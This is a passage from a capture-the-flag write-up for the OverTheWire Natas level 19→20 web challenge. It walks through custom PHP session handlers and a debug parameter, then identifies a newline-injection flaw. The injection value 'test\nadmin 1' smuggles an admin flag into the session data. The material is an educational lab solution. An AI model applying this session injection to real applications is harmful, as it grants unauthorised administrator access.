The information found about the cookie is well detailed on the [form testing](#testing-form-19). By itself doesn't give
any relevant information regarding the logic that backs it up.

#### PHP inspection 19

This time the website provides PHP code to inspect. There is a lot of it. Let's start with the end goal:

<code-block lang="php" src="otw/natas/19-20.index.php" include-lines="3-11"/>

The code uses the function `session_set_save_handler()` to define its own session handling functions. The defaults are:

<deflist type="medium">
    <def title="open($save_path, $session_name)">
        Opens the session storage.
    </def>
    <def title="close()">
        Closes the session storage.
    </def>
    <def title="read($id)">
        Reads the session storage given a session id.
    </def>
    <def title="write($id, $data)">
        Writes the session data given a session id.
    </def>
    <def title="destroy($id)">
        Destroys the session data given a session id.
    </def>
    <def title="gc($maxlifetime)">
        Garbage collection of old session data.
    </def>
</deflist>

The code only overwrites all of them, but only 2 are functional:

<tabs>
<tab title="mywrite">
    <code-block lang="php" src="otw/natas/19-20.index.php" include-lines="13-33"/>
    <p>Overview:</p>
    <list type="decimal">
        <li>Check if session is valid (only contains numbers, letters or dash).</li>
        <li>If valid, saves it into <path>$session_save_path/mysess_$sid</path>.</li>
        <li>Sorts the session data by keys in ascending order.</li>
        <li>Saves the sorted session data in the file previously created.</li>
        <li>The file is given permissions of read and write for the owner.</li>
    </list>
</tab>
<tab title="myread">
    <code-block lang="php" src="otw/natas/19-20.index.php" include-lines="35-55"/>
    <p>Overview:</p>
    <list type="decimal">
        <li>Check if session id is valid (only contains numbers, letters or dash).</li>
        <li>If valid, opens the previously created session file and reads the data.</li>
        <li>Clears the current session data contained in <code>$_SESSION</code>.</li>
        <li>Populates <code>$_SESSION</code> with the data of the session file.</li>
        <li>Encodes and returns the <code>$_SESSION</code> array.</li>
    </list>
</tab>
</tabs>

There is two more pieces of relevant code. First:

<code-block lang="php" src="otw/natas/19-20.index.php" include-lines="57-61"/>

This allows the printing of relevant information during the execution of the script. It is set by a GET request with the
key `debug` set on.

```http
GET example.com/?debug=true
```

The second and last snippet of relevant code is the one that handles the input of the user:

<code-block lang="php" src="otw/natas/19-20.index.php" include-lines="63-66"/>

This sets the `name` value on the session to the one provided by the user.

### Resolution 19

#### Preparation 19

<tabs>
<tab title="Session configuration">
    <p>
    The session configuration (what allows me to send multiple request without changing cookies):
    </p>
    <br/>
    <code-block lang="shell" src="otw/natas/19-20.resolution.ps1" include-lines="1-12"/>
</tab>
<tab title="Request handlers">
    <p>
    Another thing to do is define two web requests, one for <code>GET</code> and the other for <code>POST</code>.
    <br/>
    The first one will allow me to
    inspect the debug information between operations, while the second one will allow me to change the <code>name</code> field.
    </p>
    <br/>
    <code-block lang="shell" src="otw/natas/19-20.resolution.ps1" include-lines="14-30"/>
</tab>
</tabs>

#### Session handler injection 19

The key vulnerability is present in `myread()`:

<code-block lang="php" src="otw/natas/19-20.index.php" include-lines="47-53"/>

Particularly in this two lines:

<code-block lang="php" src="otw/natas/19-20.index.php" include-lines="51-52"/>

The code splits the data in new lines, without sanitization. Meaning `test\nadmin 1`, will translate to:

```php
$_SESSION['name'] = test;
$_SESSION['admin'] = 1;
```

The code that exploits the vulnerability is fairly simple:

<code-block lang="shell" src="otw/natas/19-20.resolution.ps1" include-lines="32-35"/>

Overview:

1. Performs the initial `GET` request.
2. Sets up the injection, escaping the newline character (PowerShell escapes characters with backtick). Then performs
   the `POST` request.
3. Executes the last `GET` request, parsing the password from the response.
